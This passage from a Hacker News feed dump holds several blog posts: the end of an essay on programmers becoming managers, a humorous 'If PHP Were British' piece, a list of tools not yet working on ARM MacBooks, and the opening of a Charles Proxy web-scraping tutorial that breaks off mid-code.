<p>But don’t fall into the trap of becoming an individual contributor again. Remember that as a manager, your output is the output of your team. You should be coding strategically. For example, to better understand the system’s quality, you can do a short pair programming session. Or organize a mob programming session to inspire or teach a group of people. Or just quickly hack a prototype to demonstrate a new business idea to customers. Your mileage might vary, but if you’re coding more than managing, it’s a warning signal.</p>

<p>Secondly, <strong>maintaining</strong> existing coding skills is easier than <strong>improving</strong> coding skills. As a manager, unlikely you’ll coding skills will improve, but you can easily stay at the same level.</p>

<p>For me, coding ~8 hours a week was more than enough to stay in good shape. I believe that with proper time planning and delegation, every developer can find those critical eight hours. There were periods in my life when I was overwhelmed at work, so I was writing code for my pet projects on weekends. Later I developed a simple rule: at work, I devote 80% of the time to management and leadership, 20% to programming. It’s possible, and it works.</p>

<p>Moreover, having less time for coding forced me to <a href="https://sizovs.net/2018/12/17/stop-learning-frameworks/">reconsider my learning strategy</a>.</p>

<h3 id="wrap-up">Wrap up</h3>

<p>The Dilbert Principle is real: good programmers are managed by bad programmers and software development processes are organized by clueless MBA wolves. Our industry, companies, and teams need competent leaders and managers with a programming background. If we – programmers – don’t want (or don’t know) how to lead and manage the development process, someone else will do this for us.</p>

<p>There is no good software without good management.</p>

<p>If you’re a good programmer – don’t be afraid of management. Learn management. Try management. And remember that trying is 100% risk-free: you can always return to programming… equipped with management skills.</p>

  </section>


</article></div>]]>
            </description>
            <link>https://sizovs.net/2020/11/03/fear-of-becoming-a-manager/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071270</guid>
            <pubDate>Thu, 12 Nov 2020 16:06:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If PHP Were British (2011)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071058">thread link</a>) | @susam
<br/>
November 12, 2020 | https://aloneonahill.com/blog/if-php-were-british/ | <a href="https://web.archive.org/web/*/https://aloneonahill.com/blog/if-php-were-british/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content_wide"><div id="content_wide_inner">

    <div id="article">
        <!-- google_ad_section_start -->

    <div>                     <p><img src="https://aloneonahill.com/images/uk_flag.jpg"></p><p>When <a href="http://toys.lerdorf.com/">Rasmus Lerdorf</a> first put <a href="http://www.php.net/">PHP</a> together, he - quite sensibly, despite his heritage - chose not to write it in Greenlandic or Danish. Good job too - that would have been rather unpleasant to work with. He opted instead, being in Canada, for a more local tongue. No, not French. Not Canadian English either. No, he went for that bastard dialect of the Queen's English commonly referred to as "US English".</p>
<p>PHP developers in Britain have been grumpy about this ever since. What was he thinking? And more importantly, how do we undo this travesty? How do we developers ensure the traditions of the British Empire continue to be upheld, even in the digital age?</p>
<h3>A Slap in the Face</h3>
<pre>$variable_name</pre>
<p>The first, but maybe the most important, of many changes that will allow PHP to achieve a more elegant feel is to remove that symbol so beloved by the US and replace it with something altogether more refined. More solid. More ... sterling.</p>
<pre>£variable_name</pre>
<h3>Getting Started</h3>
<pre>&lt;?php
    echo 'Hello World!';
?&gt;</pre>
<p>How many of today's British programmers have been put off at the outset by the brazen informality of this simple yet obscenely Americanised program, colloquially referred to as "Hello World"? A more Imperial, formal introduction might encourage a greater proportion of young British talent to remain with the language and thus give the broader community a more urbane air.</p>
<pre>&lt;?php
    announce 'Good morrow, fellow subjects of the Crown.';
?&gt;</pre>
<h3>Abbreviations</h3>
<p>Few things are more abhorrent to the British than unnecessary abbreviations. "Text speak" is unheard of on the streets of London, as the natural ingrained British grammarian simply refuses to stoop to sending messages of the "c u soon traffic kthxbye" variety, instead proferring something altogether more elegant: "Dear Sir/Madam. I will arrive as soon as time allows, which I expect to be within the hour. I assure you the horses shall not be spared. Yours respectfully." (slower to type, yes, but we do not like to be rushed).</p>
<p>PHP, on the other hand, is full to bursting with abbreviations and acronyms which are entirely unnecessary:</p>
<pre>str_replace()
is_int()
var_dump()
preg_match()
json_encode()
mysql_connect()</pre>
<p>The following changes should improve things:</p>
<pre>string_replace()
is_integer()
variable_dump()
perl_regular_expression_match()
javascript_object_notation_encode()
my_structured_query_language_connect()</pre>
<p><em>Edit: I have corrected the expansion of "preg_match" - thanks to those who pointed it out.</em></p>
<h3>Eloquence</h3>
<pre>if ($condition) {
    // Code here
} else {
    // Code here
}</pre>
<p>Shakespeare would be ashamed to see his native tongue twisted into this monstrosity. Brevity is to be applauded in the right context - in some dark corner, where it shall be seldom seen - but not here. The if ... else block is the most used conditional code in all of PHP, so it must be made as inoffensive as possible. There are many options for its replacement, but this may be the strongest:</p>
<pre>perchance (£condition) {
    // Code here
} otherwise {
    // Code here
}</pre>
<p>The same naturally applies to the Americanised switch ... case construct, which one can only describe as clunky and unpleasant:</p>
<pre>switch ($variable) {
    case $option1:
        //Code here
        break;
    case $option2:
        //Code here
        break;
    default:
        //Code here
        break;
}</pre>
<p>Words such as "switch", "break" and "default" are hard on the reader and lack context. The Right Honourable <a href="https://www.reddit.com/r/proper/comments/jp1yf/for_the_consideration_of_my_most_respectable/c2dz9zc">biggerthancheeses</a> was kind enough to contribute a more gentrified suggestion (and has some interesting ideas, particularly around replacement of "include()" with something like "i_might_be_partial_to()", demonstrating a natural talent for the Imperialisation of programming languages):</p>
<pre>what_about (£variable) {
    perhaps £possibility:
        //Code here
        splendid;
    perhaps £other_possibility:
        //Code here
        splendid;
    on_the_off_chance:
        //Code here
        splendid;
}</pre>
<h3>Spelling</h3>
<pre>imagecolorallocate()
serialize()
newt_centered_window()
connection_status()</pre>
<p>Words fail me at this point. How is any self-respecting gentleman expected to make head or tail of these "words". It beggars belief that anyone could allow such distortions of words to be entered into a programming language. They, along with the cornucopia of similar errors, should be reverted to their proper forms immediately:</p>
<pre>imagecolourallocate()
serialise()
newt_centred_window()
connexion_status()<sup><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#note1" id="notelink1">1</a></sup></pre>
<h3>Manners</h3>
<pre>try {
    // Code here
} catch (Exception $e) {
    // Handle exception
    die('Message');
}</pre>
<p>The try ... catch block is an excellent example of PHP's lack of manners. Far too direct to be allowed in the new PHP. Additionally, the word "die" is so very depressing. This new block, although more verbose, is vastly more polite and upbeat:</p>
<pre>would_you_mind {
    // Code here
} actually_i_do_mind (Exception £e) {
    // Politely move on
    cheerio('Message');
}</pre>
<h3>Class</h3>
<p>Perhaps nothing is as important and ingrained in the British psyche as the notion of class and, while there are few opportunities for change within this part of PHP, the changes that there are to be made here are important.</p>
<pre>class Republic {
    public $a;
    private $b;
    protected $c;
}
$example = new Republic();</pre>
<p>To begin with, the current system has no place for class hierarchy and this is unacceptable. So we shall begin by giving classes specific levels - upper, middle, working - and no class can access the methods of one of a higher level without the explicit permission of the higher order class (of course, though it might then have access, it would not be a true member of the higher order and could not itself grant higher order access to other lower order classes). "Public" and "Private", in the British class system, are often synonymous (see, for example, school system nomenclature), so these must be adjusted, as should the "Protected" property visibility. The word "new", while passable, has a much more appropriate replacement in matters of class.</p>
<pre>upper_class Empire {
    state £a;
    private £b;
    hereditary £c;
}
£example = nouveau Empire();</pre>
<h3>The Sun Never Sets ...</h3>
<p>It is hoped that these few simple changes will improve the reputation and status of PHP among other languages. No longer will it be the poor American cousin - instead it can take its rightful place as the - British - King of the scripting languages.</p>
<h3>Thanks</h3>
<p>Many thanks to <a href="https://twitter.com/#!/markwallman">Mark</a> and <a href="https://twitter.com/#!/bluevurt">Pat</a>, former colleagues, who helped start this resurrection of the British Empire in the pub on Friday.</p>
<p><a href="https://aloneonahill.com/%5B~%5B*id*%5D~%5D#notelink1" id="note1">1</a>. Yes, <a href="https://en.wikipedia.org/wiki/American_and_British_English_spelling_differences#-xion.2C_-ction">connexion</a>.</p>

    <p>
      <i></i> <span>20 August 2011</span> &nbsp; | &nbsp; <i></i>          <a href="https://aloneonahill.com/blog/?tag=php">php</a>,          <a href="https://aloneonahill.com/blog/?tag=development">development</a>,          <a href="https://aloneonahill.com/blog/?tag=humour">humour</a>,          <a href="https://aloneonahill.com/blog/?tag=empire">empire</a>    </p>

    
    
    



















    </div>

        <!-- /sidebar -->

        <!-- google_ad_section_end -->
              </div>

    </div></div></div>]]>
            </description>
            <link>https://aloneonahill.com/blog/if-php-were-british/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071058</guid>
            <pubDate>Thu, 12 Nov 2020 15:47:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libraries that don't run on the new MBPs yet]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071022">thread link</a>) | @RikNieu
<br/>
November 12, 2020 | https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/ | <a href="https://web.archive.org/web/*/https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<p>(Photo by <a href="https://unsplash.com/@tma?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Tianyi Ma</a> on <a href="https://unsplash.com/s/photos/macbook?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a>)</p><p>Even though I have my issues with Apple's MacBooks(DONGLES!), I'm still pretty excited for the new ARM-based MacBook Pro. My current machine is nearing the end of its life, and I am on the prowl for an updated one.</p><p>And with <a href="https://www.macrumors.com/2020/11/11/m1-macbook-air-first-benchmark/">posts like this one by MacRumors</a>, indicating that the freaking ARM MacBook Air will outperform any existing Mac on a single-core, and on multi-core it wipes the floor with all of the 2019 16-inch MacBook Pros, I'm really blown away by the possible performance increases the new MacBook Pro would offer!</p><p>But beneath my excitement for the much-touted performance and battery-life improvements lurks the potential compatibility issues that switching to new silicon could bring. </p><p>Will I spend the money equivalent to a small countries GDP, and then sit with a spoiled-brat machine refusing to work with the icky libraries and tools I use on a daily basis? Also, would stuff I code on an ARM MBP work on my Intel &amp; Linux servers?</p><p>Well, other developers have been wondering the same, and someone started a helpful <a href="https://github.com/Homebrew/brew/issues/7857">issues thread on the Homebrew Github</a>, with a list of popular libraries and tools, and if they work on the new Macs.</p><p>Here's 10 tools and libraries that, as-of 12 Nov 2020, are still not fully supported yet.</p><ul><li><strong>Bash</strong></li><li><strong>Cask</strong></li><li><strong>Cocoapods</strong></li><li><strong>Numpy</strong></li><li><strong>Docker</strong></li><li><strong>Openjdk (Gradle, Elasticsearch, React-Native, Android, Jenkins, Maven)</strong></li><li><strong>Go (Kubernetes)</strong></li><li><strong>MySQL</strong></li><li><strong>Postgress</strong></li><li><strong> Zsh</strong></li></ul><p>Those would be crucial to get working before I'd seriously consider forking out the cash for a new Mac. Let's watch this space.</p><p>Thanks for reading. If you have any comments or suggestions, follow and contact me on Twitter <a href="https://twitter.com/riknieu">@RikNieu</a>.</p><p>If you want to read more of my rants, sign up below and I'll mail you when I post new stuff. 👇</p>
			</section></div>]]>
            </description>
            <link>https://www.riknieu.com/top-10-libraries-not-running-on-the-new-mbp/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071022</guid>
            <pubDate>Thu, 12 Nov 2020 15:43:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charles Proxy for Web Scraping]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25070934">thread link</a>) | @daolf
<br/>
November 12, 2020 | https://www.scrapingbee.com/blog/charles-proxy/ | <a href="https://web.archive.org/web/*/https://www.scrapingbee.com/blog/charles-proxy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><img src="https://d33wubrfki0l68.cloudfront.net/0c341714fac1e681a51f25db8d80853d341830a9/c3aea/images/authors/kevin.png" alt="Kevin Sahin">
            
            <span>
                
                
                
                <span>
                    <small> ● </small>
                    
                    
                    <span>12 November, 2020</span>
                    
                    <small> ● </small>
                    <span> 10 min read </span>
                </span>
                <p> Kevin has been working in the web scraping industry for 10 years before co-founding <a href="https://www.scrapingbee.com/">ScrapingBee</a>. He is also the author of the Java Web Scraping Handbook.
                        
                        <a href="https://twitter.com/SahinKevin" target="_blank">
                        <svg style="height: 14px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                            <path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" fill="currentColor"></path>
                        </svg>
                        </a>
                        
                        
                    </p>
            </span>
        </p><div property="articleBody">
          





















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
      
      " src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg" width="1200" height="628" alt="Charles proxy for web scraping" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/27c691c6188c7fe4eb579cde7c5f824aa683c60e/4794a/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_825x0_resize_q75_catmullrom.jpg 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/3fb096be65ede7086722d0f0a7a0f128c07b6a22/74124/blog/charles-proxy/charles_proxy_header_hue585f61b28a74a671118de43150c5d63_43495_1200x0_resize_q75_catmullrom.jpg 1200w
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/4163ae1ee1b2e68f8dcbed8300bf0932a70ec915/10de1/blog/charles-proxy/charles_proxy_header.jpg">
  
</p></div>




<p>Charles proxy is an HTTP debugging proxy that can inspect network calls and debug SSL traffic. With Charles, you are able to inspect requests/responses, headers and cookies. Today we will see how to set up Charles, and how we can use Charles proxy for web scraping. We will focus on extracting data from Javascript-heavy web pages and mobile applications. Charles sits between your applications and the internet:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png" width="759" height="419" alt="Charles proxy drawing" data-src="https://d33wubrfki0l68.cloudfront.net/96cee26a1c13dff5a76f17f5c760c70b4e267a67/71117/blog/charles-proxy/charles_drawing.png">
  
</p></div>




<p>Charles is like the Chrome dev tools on steroids. It has many incredible features:</p>
<ul>
<li>Bandwidth throttling to emulate slow internet connection</li>
<li>Request editing (the test the behavior of a back-end API for example)</li>
<li>Repeat requests</li>
<li>Full-text search on a list of request (very interesting for web-scraping)</li>
<li>Many more</li>
</ul>
<p>Charles is a very interesting tool when debugging Single Page application or mobile applications.</p>
<h2 id="installation-and-setup">Installation and set-up</h2>
<p>We are going to see how to install and configure Charles on macOS, but there is also a Windows and Linux version.</p>
<p>First visit <a href="https://www.charlesproxy.com/download/">https://www.charlesproxy.com/download/</a> and download Charles.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png" width="758" height="568" alt="Charles Installation Screen" data-src="https://d33wubrfki0l68.cloudfront.net/c942420600c60ee1d70fa6c522f77134fd378055/6c20f/blog/charles-proxy/charles_install.png">
  
</p></div>

<figcaption>
    <small> <em> Network tab of your browser developer console </em> </small>
</figcaption>


<p>After installing Charles, you need to install its root certificate. This will allow Charles to intercept and decrypt the SSL traffic.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png" width="1907" height="989" alt="Charles Root certificate" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/b858dc5ff02dbfcf22c15af6f28c903834ca56a2/17b6c/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/0d05c8b0e8cf7c75e6f3103ab7f7d8c0e7b2801a/380e5/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/1b097620236e124bfea452b202612c875279950c/7af21/blog/charles-proxy/root-certificate_hu6cc3d5836dbca159577b3f6dd3405add_276647_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/7557901e88720e280d75eb07f7881f37df6a17cc/a65ba/blog/charles-proxy/root-certificate.png">
  
</p></div>




<p>After clicking on Install Root Certificate, it will open your macOS Keychain Access, and you will have to open the Trust menu and click on “Always trust”.</p>
<p>This will ask you for your system password.</p>
<p>Now you will need to go to Proxy &gt; SSL Proxying Settings and add “*” or the domain you want to inspect SSL on.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png" width="704" height="577" alt="SSL Proxying settings" data-src="https://d33wubrfki0l68.cloudfront.net/9a166609eee9057a6b518e983faf3a7939961f14/da076/blog/charles-proxy/ssl-settings.png">
  
</p></div>




<p>Charles will now capture the HTTPS traffic on the domain you've selected.</p>
<h2 id="finding-hidden-apis-on-single-page-applications">Finding hidden APIs on Single Page Applications</h2>
<p>In a traditional <em><strong>server-side</strong></em> rendered website, the HTML code is built by the backend service, and the full page is returned to the HTTP client (generally your browser).
Over the past 10 years, more and more websites are rendered <em><strong>client-side</strong></em> using a Single Page Application framework like React.js, Vue.js or Angular.</p>
<p>Those framework are sending many requests to a back-end API, and it can be a great idea to consume those APIs directly instead of scraping the site and rendering the Javascript with a headless browser to extract the data you want. It will be much faster, you don't need expensive hardware (headless browser needs a lot of RAM and powerful CPUs.).</p>
<p>We are going to look at different Single Page Application to see how Charles proxy can help you discover and extract data from back-end APIs.</p>
<p>Let's start with <a href="https://www.producthunt.com/">ProductHunt</a></p>
<p>ProductHunt is a famous website to launch products online. It's very popular in the tech ecosystem. There are dozens of projects launched every day, so the front page only loads the products of the day. There is an infinite scroll to look at previous days products.</p>
<p>We are going to use Charles proxy to analyze the backend API call and reproduce it with some Python code.</p>
<p>Now open Charles proxy and go to the Producthunt home page, scroll several times to the bottom of the page.</p>
<p>By default, Charles will capture every HTTP request made by your system, not only your browser. So you will get a lot of “pollution”. You can filter that by entering the domain you're interested in:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png" width="1905" height="460" alt="Filter by domain in Charles" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/47931b5b58ae2245ff98bc98032f3404bb28a56f/b85f4/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/9ecae3d05e809709f0d039ce8c19ca8025b11387/4bb81/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/71bf530cdcf033637dba926220fa528d526df002/2f072/blog/charles-proxy/charles_filter_huea464f70727612c3c89c18a2a64372ba_104579_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/272a70f0775e173e0cabfc5a72690fcdc5e139e9/9eb41/blog/charles-proxy/charles_filter.png">
  
</p></div>




<p>If you click on one of the POST requests to the <code>/frontend/graphql</code> endpoint, you can inspect both the request and the response.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
      
      
        , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
      
      
        , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
      " src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png" width="1904" height="960" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/4e8a478174ef6a8e4bd7c4e8fec851e3595e7fa6/f4a8e/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_825x0_resize_catmullrom_2.png 825w
    
    
      , https://d33wubrfki0l68.cloudfront.net/b956a33798961031c094f73e32ffe24e9cc55e02/44032/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1200x0_resize_catmullrom_2.png 1200w
    
    
      , https://d33wubrfki0l68.cloudfront.net/4db37d8e9dd976d341f07356c9d716219122b94e/4436d/blog/charles-proxy/product_hunt_graphql1_hu3869c22f83f3b8a2b9a4675617d88b62_194867_1500x0_resize_catmullrom_2.png 1500w 
    " data-src="https://d33wubrfki0l68.cloudfront.net/939c0b04b7b3d8613354fb3d3f89f0d19d20325b/451c1/blog/charles-proxy/product_hunt_graphql1.png">
  
</p></div>




<p>There are many things going on with these requests, but if you compare the content being sent to the GraphQL API, it seems the only thing that changes is the <code>cursor</code> parameter.</p>
<p>It is base64 encoded, but luckily, Charles has a feature to quickly decode Base64 content. You just have to select it and right-click:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png" width="433" height="470" alt="Sequence of request in Charles proxy, from ProductHunt home page" data-src="https://d33wubrfki0l68.cloudfront.net/b6734761222929a603852e3310a4248ce09d7ece/f5dc1/blog/charles-proxy/base64decode.png">
  
</p></div>




<p>One of the killer features Charles offers is the ability to edit any request and replay. In our case it's really great because there are many headers/cookies values inside the request, so it would be a nightmare to try to reproduce the request with an HTTP client or inside your code.</p>
<p>In order to do that, you can right-click on the request and click on Compose.</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
        , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png" width="1094" height="521" alt="Compose request Charles proxy" data-srcset="
    
      , https://d33wubrfki0l68.cloudfront.net/fa48d399f93a2ffdf8ff79613acb85956789ce76/2beba/blog/charles-proxy/compose_charles_hubc4f61e8969f6a1e56de0390583567a6_43272_825x0_resize_catmullrom_2.png 825w
    
    
    " data-src="https://d33wubrfki0l68.cloudfront.net/f6e5d702cb0531ba1719c9cc807ad4dc73282717/580da/blog/charles-proxy/compose_charles.png">
  
</p></div>




<p>You can then play with the <code>cursor</code> value and replace it with a different page number encoded in base64. Then click on Execute.</p>
<p>You can also try deleting the different cookies (it will work). It's great news because if cookies were mandatory to use this endpoint, it would have been more complicated to reproduce the request with our Python code.</p>
<p>Now you can export the request to cURL:</p>






















<div>
  
  <p><img loading="lazy" srcset="
      
      
      " src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png" width="665" height="496" alt="Compose request Charles proxy" data-src="https://d33wubrfki0l68.cloudfront.net/d4650e428f9936b26cd8a6cff8e4fc9a50af9f72/76968/blog/charles-proxy/export_curl.png">
  
</p></div>




<p>Then you can use a tool like this one to convert the cURL command to Python code (using the wonderful Requests package): <a href="https://curl.trillworks.com/"></a><a href="https://curl.trillworks.com/">https://curl.trillworks.com/</a></p>
<p>I just added the <code>verify=False</code> parameter to avoid SSL warnings with Requests.</p>
<div><pre><code data-lang="python"><span>import</span> requests


headers <span>=</span> {
    <span></span><span>'</span><span>Host</span><span>'</span>: <span></span><span>'</span><span>www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>accept</span><span>'</span>: <span></span><span>'</span><span>*/*</span><span>'</span>,
    <span></span><span>'</span><span>x-requested-with</span><span>'</span>: <span></span><span>'</span><span>XMLHttpRequest</span><span>'</span>,
    <span></span><span>'</span><span>user-agent</span><span>'</span>: <span></span><span>'</span><span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36</span><span>'</span>,
    <span></span><span>'</span><span>content-type</span><span>'</span>: <span></span><span>'</span><span>application/json</span><span>'</span>,
    <span></span><span>'</span><span>origin</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-site</span><span>'</span>: <span></span><span>'</span><span>same-origin</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-mode</span><span>'</span>: <span></span><span>'</span><span>cors</span><span>'</span>,
    <span></span><span>'</span><span>sec-fetch-dest</span><span>'</span>: <span></span><span>'</span><span>empty</span><span>'</span>,
    <span></span><span>'</span><span>referer</span><span>'</span>: <span></span><span>'</span><span>https://www.producthunt.com/</span><span>'</span>,
    <span></span><span>'</span><span>accept-language</span><span>'</span>: <span></span><span>'</span><span>en-US,en;q=0.9</span><span>'</span>,
}

data <span>=</span> <span></span><span>'</span><span>{</span><span>"</span><span>operationName</span><span>"</span><span>:</span><span>"</span><span>HomePage</span><span>"</span><span>,</span><span>"</span><span>variables</span><span>"</span><span>:{</span><span>"</span><span>cursor</span><span>"</span><span>:</span><span>"</span><span>OA==</span><span>"</span><span>,</span><span>"</span><span>featured</span><span>"</span><span>:true,</span><span>"</span><span>includePromotedPost</span><span>"</span><span>:false,</span><span>"</span><span>visibleOnHomepage</span><span>"</span><span>:true,</span><span>"</span><span>includeLayout</span><span>"</span><span>:false},</span><span>"</span><span>query</span><span>"</span><span>:</span><span>"</span><span>query HomePage($cursor: String, $postCursor: String, $featured: Boolean!, $includePromotedPost: Boolean!, $visibleOnHomepage: Boolean!) {</span><span>\\</span><span>n sections(first: 1, after: $cursor, featured: $featured) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n cursor</span><span>\\</span><span>n node {</span><span>\\</span><span>n id</span><span>\\</span><span>n date</span><span>\\</span><span>n cutoff_index</span><span>\\</span><span>n posts_count</span><span>\\</span><span>n cards(first: 1, after: $cursor) {</span><span>\\</span><span>n edges {</span><span>\\</span><span>n node {</span><span>\\</span><span>n ...FeedCards</span><span>\\</span><span>n 